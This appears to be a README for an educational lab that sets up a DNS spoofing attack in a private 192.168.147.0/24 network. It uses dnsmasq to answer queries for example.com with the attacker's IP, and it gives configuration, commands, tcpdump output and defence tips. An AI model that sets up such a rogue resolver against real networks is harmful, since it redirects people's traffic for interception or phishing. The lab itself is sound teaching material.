# 🔐 DNS Spoofing Lab - Complete Guide

> **⚠️ Educational Purpose Only**: This lab is designed for cybersecurity education and authorized penetration testing. Do not use these techniques on networks you don't own or without explicit permission.

## 📋 Table of Contents
- [Lab Environment](#-lab-environment)
- [Network Setup](#-network-setup)
- [DNS Server Configuration](#-dns-server-configuration)
- [Victim Configuration](#-victim-configuration)
- [Traffic Analysis](#-traffic-analysis)
- [Lab Results](#-lab-results)
- [Summary](#-summary)

---

## 🏗️ Lab Environment

### Network Topology
```
┌─────────────────┐    DNS Query     ┌─────────────────┐
│   Victim        │ ───────────────► │   Attacker      │
│ 192.168.147.20  │                  │ 192.168.147.10  │
│   (max)         │ ◄─────────────── │   (vouce)       │
└─────────────────┘   Spoofed IP     └─────────────────┘
```

| Component | Details |
|-----------|---------|
| **Attacker IP** | `192.168.147.10` (Kali Linux/Debian) |
| **Victim IP** | `192.168.147.20` (Linux Client) |
| **Gateway** | `192.168.147.1` (Optional) |
| **Target Domain** | `example.com` |
| **Network** | `192.168.147.0/24` |

---

## 🌐 Network Setup

<details>
<summary><strong>🔧 Attacker Configuration (vouce)</strong></summary>

### Check Network Interface
```bash
ip a show eth0
```

**Expected Output:**
```
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 ...
    inet 192.168.147.10/24 scope global eth0
```

### Configure Static IP (if needed)
```bash
# Assign static IP if not already assigned
sudo ip addr add 192.168.147.10/24 dev eth0
sudo ip link set eth0 up
```

### Verify Routing
```bash
ip route
```

**Expected Output:**
```
default via 192.168.147.1 dev eth0
192.168.147.0/24 dev eth0 proto kernel scope link src 192.168.147.10
```

</details>

<details>
<summary><strong>🎯 Victim Configuration (max)</strong></summary>

### Check Network Interface
```bash
ip a show eth0
```

**Expected Output:**
```
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 ...
    inet 192.168.147.20/24 scope global eth0
```

### Configure Network (if needed)
```bash
# Assign IP if necessary
sudo ip addr add 192.168.147.20/24 dev eth0
sudo ip link set eth0 up

# Set default gateway
sudo ip route add default via 192.168.147.1
```

### Verify Configuration
```bash
ip a
ip route
```

**Expected Output:**
```
default via 192.168.147.1 dev eth0
192.168.147.0/24 dev eth0 proto kernel scope link src 192.168.147.20
```

</details>

---

## 🔧 DNS Server Configuration

### Install dnsmasq
```bash
sudo apt update
sudo apt install dnsmasq -y
```

### Check Version
```bash
dnsmasq --version
```

**Output:**
```
Dnsmasq version 2.91
```

<details>
<summary><strong>📝 Configure dnsmasq</strong></summary>

### Edit Configuration File
```bash
sudo nano /etc/dnsmasq.conf
```

### Add Configuration
```conf
# Listen only on attacker IP
listen-address=192.168.147.10

# Bind to specific interfaces only
bind-interfaces

# Spoof example.com to attacker IP
address=/example.com/192.168.147.10

# Don't query upstream DNS servers
no-resolv
```

**Configuration Explanation:**
- `listen-address` - IP address dnsmasq will listen on
- `bind-interfaces` - Bind only to specified interface
- `address` - Domain to IP mapping (spoofing rule)
- `no-resolv` - Don't query upstream DNS servers

</details>

### Start dnsmasq
```bash
# Stop any existing dnsmasq processes
sudo pkill dnsmasq

# Start dnsmasq with spoofing configuration
sudo dnsmasq --no-daemon \
  --interface=eth0 \
  --bind-interfaces \
  --no-resolv \
  --address=/example.com/192.168.147.10
```

**Expected Output:**
```
dnsmasq: started, version 2.91 cachesize 150
dnsmasq: read /etc/hosts - 8 names
dnsmasq: warning: no upstream servers configured
```

### Verify dnsmasq is Running
```bash
sudo ss -ulpn | grep :53
```

**Expected Output:**
```
UNCONN 0 0 127.0.0.1:53 0.0.0.0:* users:(("dnsmasq",pid=314782,fd=6))
UNCONN 0 0 192.168.147.10:53 0.0.0.0:* users:(("dnsmasq",pid=314782,fd=4))
UNCONN 0 0 [::1]:53 0.0.0.0:* users:(("dnsmasq",pid=314782,fd=8))
```

---

## 🎯 Victim Configuration

### Configure DNS Server
```bash
sudo nano /etc/resolv.conf
```

### Add Attacker as DNS Server
```conf
nameserver 192.168.147.10
```

### Test DNS Resolution
```bash
dig example.com
```

**Expected Output:**
```
; <<>> DiG 9.20.9-1-Debian <<>> example.com
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 25879
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1
;; ANSWER SECTION:
example.com. 0 IN A 192.168.147.10
```

### Test Connectivity
```bash
ping example.com
```

**Expected Output:**
```
PING example.com (192.168.147.10) 56(84) bytes of data.
64 bytes from 192.168.147.10: icmp_seq=1 ttl=64 time=0.165 ms
```

---

## 📊 Traffic Analysis

### Capture DNS Traffic (on Attacker)
```bash
sudo tcpdump -i eth0 port 53 -vv
```

### Sample Capture Output
```
09:00:01.123456 IP 192.168.147.20.53321 > 192.168.147.10.53: 12345+ A? example.com
09:00:01.123789 IP 192.168.147.10.53 > 192.168.147.20.53321: 12345 1/0/0 A 192.168.147.10
```

### Traffic Flow Analysis
1. **Victim** sends DNS query for `example.com`
2. **Attacker** responds immediately with spoofed IP `192.168.147.10`
3. **Victim** receives spoofed response and redirects traffic to attacker
4. **Attack successful** - All traffic to `example.com` goes to attacker

---

## 📈 Lab Results

<details>
<summary><strong>📋 Summary Table</strong></summary>

| Step | Attacker (vouce) | Victim (max) |
|------|------------------|--------------|
| **IP Configuration** | `192.168.147.10/24` | `192.168.147.20/24` |
| **Default Gateway** | `192.168.147.1` | `192.168.147.1` |
| **DNS Server** | `dnsmasq on 192.168.147.10` | `nameserver 192.168.147.10` |
| **DNS Query for example.com** | Response: `192.168.147.10` (spoofed) | Receives `192.168.147.10` |
| **Packet Capture** | ✅ Yes (tcpdump on port 53) | ❌ No |

</details>

### Attack Flow Diagram
```
┌─────────────────────┐
│   Victim            │
│ (192.168.147.20)    │
└─────────┬───────────┘
          │
          │ 1. DNS query: example.com?
          ▼
┌─────────────────────┐
│   Attacker          │
│ (192.168.147.10)    │
│   dnsmasq running   │
└─────────┬───────────┘
          │
          │ 2. Response: example.com → 192.168.147.10
          ▼
┌─────────────────────┐
│   Victim receives   │
│   spoofed IP        │
└─────────┬───────────┘
          │
          │ 3. ping/connect to 192.168.147.10
          ▼
┌─────────────────────┐
│   Attacker receives │
│   redirected traffic│
└─────────────────────┘
```

---

## 📝 Summary

### 🎯 What We Accomplished
- ✅ Set up **attacker machine** with static IP and `dnsmasq`
- ✅ Configured **victim machine** to use attacker as DNS server
- ✅ Successfully **spoofed DNS queries** for `example.com`
- ✅ **Redirected victim traffic** to attacker machine
- ✅ **Captured and analyzed** DNS traffic

### 🔍 Key Learning Points
1. **DNS spoofing** can redirect legitimate traffic to malicious servers
2. **Evil Twin attacks** exploit DNS resolution to intercept communications
3. **Network monitoring** tools like `tcpdump` help analyze attack traffic
4. **Proper DNS configuration** is critical for network security

### 🛡️ Defense Strategies
- Use **encrypted DNS** (DNS over HTTPS/TLS)
- Implement **DNS filtering** and monitoring
- Use **VPN connections** for sensitive communications
- Regular **network security audits**
- **DNSSEC validation** where possible

---

> **🔬 Lab Complete**: DNS Spoofing attack successfully demonstrated using dnsmasq Evil Twin technique. Always use this knowledge responsibly and only on networks you own or have explicit permission to test.
